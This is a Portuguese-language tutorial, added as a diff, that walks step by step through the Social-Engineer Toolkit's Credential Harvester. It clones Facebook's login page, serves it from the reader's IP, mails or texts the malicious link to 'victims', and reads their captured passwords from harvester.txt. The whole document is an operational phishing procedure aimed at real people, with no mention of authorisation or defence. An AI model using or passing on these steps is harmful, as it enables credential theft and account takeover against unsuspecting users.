@@ -1,0 +1,34 @@
+. Seleção de Ataque
+No SET, escolha a opção de ataque social (Social-Engineering Attacks) digitando 1 e, em seguida, selecione ataques a vetores de site (Website Attack Vectors) digitando 2.
+
+1. Social-Engineering Attacks
+2. Website Attack Vectors
+2. Método de Ataque Credential Harvester
+Escolha o método de ataque Credential Harvester (clonagem de credenciais) digitando 3.
+
+3. Credential Harvester Attack Method
+3. Clonagem do Site
+Selecione a opção de clonagem de site (Site Cloner) digitando 2.
+
+2. Site Cloner
+4. Configuração de Parâmetros
+Digite o endereço IP do seu servidor, obtido com o comando ifconfig, e o endereço do site que deseja clonar (por exemplo, https://www.facebook.com).
+
+Seu endereço IP: <seu_ip>
+Endereço do Site: https://www.facebook.com
+5. Clonagem e Início do Servidor Web
+Aguarde o SET clonar o site escolhido e iniciar o servidor web.
+
+6. Envio do Link Malicioso
+Use a opção correspondente no SET para enviar o link malicioso para as vítimas por e-mail, SMS ou outro meio.
+
+1. E-Mail Attack Mass Mailer
+ou
+4. Create a Payload and Listener
+7. Captura de Credenciais
+Quando as vítimas acessarem o link e inserirem suas credenciais, estas serão salvas em um arquivo chamado harvester.txt na pasta do SET.
+
+8. Visualização das Credenciais Capturadas
+Para visualizar as credenciais capturadas, utilize o comando cat harvester.txt.
+
+cat harvester.txt
